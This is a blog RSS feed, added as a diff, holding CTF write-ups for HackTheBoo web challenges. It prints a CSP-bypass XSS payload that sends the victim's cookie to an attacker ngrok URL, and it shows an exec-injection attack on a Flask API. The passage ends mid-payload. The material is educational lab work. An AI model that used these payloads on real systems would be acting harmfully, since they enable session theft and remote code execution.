@@ -1,0 +1,180 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>HackTheBox on chaos</title>
+    <link>https://m0hs1ne.github.io/tags/hackthebox/</link>
+    <description>Recent content in HackTheBox on chaos</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 28 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://m0hs1ne.github.io/tags/hackthebox/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBoo web challenges</title>
+      <link>https://m0hs1ne.github.io/posts/hacktheboo/</link>
+      <pubDate>Fri, 28 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://m0hs1ne.github.io/posts/hacktheboo/</guid>
+      <description>Cursed Secret Party  You&amp;rsquo;ve just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?
+ Solution Looking through the provided source code, we see a bot.js file which reads the flag.txt file.
+const fs = require(&amp;#39;fs&amp;#39;); const puppeteer = require(&amp;#39;puppeteer&amp;#39;); const JWTHelper = require(&amp;#39;.</description>
+      <content>&lt;h1 id=&#34;cursed-secret-party&#34;&gt;Cursed Secret Party&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;You&amp;rsquo;ve just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
+&lt;p&gt;Looking through the provided source code, we see a &lt;code&gt;bot.js&lt;/code&gt; file which reads the flag.txt file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;puppeteer&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puppeteer&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JWTHelper&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./helpers/JWTHelper&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readFileSync&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/flag.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;visit&lt;/code&gt; function opens a browser page and sets a &lt;code&gt;JWT&lt;/code&gt; token as a cookie. The flag is passed in said token. So we obviously need to steal the bot&amp;rsquo;s cookie to get the flag.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;visit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; () =&amp;gt; {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;browser&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;puppeteer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;launch&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;browser_options&lt;/span&gt;);
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;browser&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createIncognitoBrowserContext&lt;/span&gt;();
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;newPage&lt;/span&gt;();
+
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JWTHelper&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sign&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;user_role&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; });
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setCookie&lt;/span&gt;({
+			&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;session&amp;#39;&lt;/span&gt;,
+			&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;,
+			&lt;span style=&#34;color:#a6e22e&#34;&gt;domain&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1:1337&amp;#39;&lt;/span&gt;
+		});
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After the bot sets the cookie, it visits the &lt;code&gt;/admin&lt;/code&gt; endpoint, waits 5 seconds, then deletes all the content.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://127.0.0.1:1337/admin&amp;#39;&lt;/span&gt;, {
+			&lt;span style=&#34;color:#a6e22e&#34;&gt;waitUntil&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;networkidle2&amp;#39;&lt;/span&gt;,
+			&lt;span style=&#34;color:#a6e22e&#34;&gt;timeout&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt;
+		});
+
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://127.0.0.1:1337/admin/delete_all&amp;#39;&lt;/span&gt;, {
+			&lt;span style=&#34;color:#a6e22e&#34;&gt;waitUntil&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;networkidle2&amp;#39;&lt;/span&gt;,
+			&lt;span style=&#34;color:#a6e22e&#34;&gt;timeout&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt;
+		});
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the index.js file we notice that we have some definitions set for the CSP.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;) {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setHeader&lt;/span&gt;(
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Security-Policy&amp;#34;&lt;/span&gt;,
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;script-src &amp;#39;self&amp;#39; https://cdn.jsdelivr.net ; style-src &amp;#39;self&amp;#39; https://fonts.googleapis.com; img-src &amp;#39;self&amp;#39;; font-src &amp;#39;self&amp;#39; https://fonts.gstatic.com; child-src &amp;#39;self&amp;#39;; frame-src &amp;#39;self&amp;#39;; worker-src &amp;#39;self&amp;#39;; frame-ancestors &amp;#39;self&amp;#39;; form-action &amp;#39;self&amp;#39;; base-uri &amp;#39;self&amp;#39;; manifest-src &amp;#39;self&amp;#39;&amp;#34;&lt;/span&gt;
+    );
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We noticed this earlier in our Response as well:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Content-Security-Policy: script-src &#39;self&#39; https://cdn.jsdelivr.net ; style-src &#39;self&#39; https://fonts.googleapis.com; img-src &#39;self&#39;; font-src &#39;self&#39; https://fonts.gstatic.com; child-src &#39;self&#39;; frame-src &#39;self&#39;; worker-src &#39;self&#39;; frame-ancestors &#39;self&#39;; form-action &#39;self&#39;; base-uri &#39;self&#39;; manifest-src &#39;self&#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After a little bit of research about CSP and XSS, I found out in the CSP evaluator :&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cdn.jsdelivr.net is known to host JSONP endpoints and Angular libraries which allow to bypass this CSP.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can host an &lt;code&gt;xss.js&lt;/code&gt; file on a GH repository and add something like alert(1). We can finally trigger the alert, but we need to cookie.&lt;/p&gt;
+&lt;p&gt;Digging deep enough, i found out this repository: &lt;a href=&#34;https://github.com/CanardMandarin/csp-bypass&#34;&gt;CSP bypass&lt;/a&gt;. It&amp;rsquo;s a simple project that allows the bypass of csp.&lt;/p&gt;
+&lt;p&gt;we need to create a script tag that point to that repository and  execute a &amp;ldquo;query&amp;rdquo; to our ngrok.&lt;/p&gt;
+&lt;p&gt;Finally we got it:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://cdn.jsdelivr.net/gh/canardmandarin/csp-bypass@master/dist/sval-classic.js&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/script&amp;gt;&amp;lt;br csp=&amp;#34;window.location=&amp;#39;[ngrok url]/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;concat&lt;/span&gt;(document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;)&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We got the cookie.
+In the &lt;code&gt;JWTHelper.js&lt;/code&gt; file we see how the JWT token is signed. It uses HS256 with a big random hex string .&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;APP_SECRET&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;crypto&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;randomBytes&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;);
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;sign&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;) {
+		&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;assign&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;);
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sign&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;APP_SECRET&lt;/span&gt;, { &lt;span style=&#34;color:#a6e22e&#34;&gt;algorithm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HS256&amp;#39;&lt;/span&gt; }))
+	},
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;verify&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;) {
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;verify&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;APP_SECRET&lt;/span&gt;, { &lt;span style=&#34;color:#a6e22e&#34;&gt;algorithm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HS256&amp;#39;&lt;/span&gt; }));
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finaly we decoded our token using &lt;code&gt;jwt.io&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The flag :&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTB{cdn_c4n_byp4ss_c5p!!}
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;evaluation-deck&#34;&gt;Evaluation Deck&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;solution-1&#34;&gt;Solution&lt;/h2&gt;
+&lt;p&gt;We are given the source code for the website, after reading some of the code, I found an API that features an interesting method that supposedly calculates the health of the ghost (in the website) from the given parameters.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;route(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/get_health&amp;#39;&lt;/span&gt;, methods&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;])
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;count&lt;/span&gt;():
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;is_json:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid JSON!&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;
+
+    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_json()
+
+    current_health &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;current_health&amp;#39;&lt;/span&gt;)
+    attack_power &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;attack_power&amp;#39;&lt;/span&gt;)
+    operator &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;operator&amp;#39;&lt;/span&gt;)
+    
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; current_health &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; attack_power &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; operator:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;All fields are required!&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;
+
+    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+        code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; compile(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;result = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;int(current_health)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;operator&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;int(attack_power)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;string&amp;gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exec&amp;#39;&lt;/span&gt;)
+        exec(code, result)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response(result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;result&amp;#39;&lt;/span&gt;))
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Something Went Wrong!&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, they are using Python&amp;rsquo;s &lt;code&gt;compile&lt;/code&gt; and &lt;code&gt;exec&lt;/code&gt; function, which can be very dangerous when executed from unsanitized user input.&lt;/p&gt;
+&lt;p&gt;We can control all the parameters, but &lt;code&gt;current_health&lt;/code&gt; and &lt;code&gt;attack_power&lt;/code&gt; are converted to int and that limits us to passing only numbers.&lt;/p&gt;
+&lt;p&gt;That leaves us with &lt;code&gt;operator&lt;/code&gt; that needs to be added to two numbers. So I tried to find a way to convert the flag into a number which can then be converted back  into the flag itself.&lt;/p&gt;
+&lt;p&gt;I ended up converting the flag into &lt;code&gt;ASCII&lt;/code&gt; unicode using the following function :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;ord(character)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So the final payload to be sent as a POST reqeust to api:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+  &lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[IP]/api/get_health&amp;#34;&lt;/span&gt;, {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;,
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;headers&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/json&amp;#34;&lt;/span&gt;,
+    },
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;({
+      &lt;span style=&#34;color:#a6e22e&#34;&gt;current_health&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;,
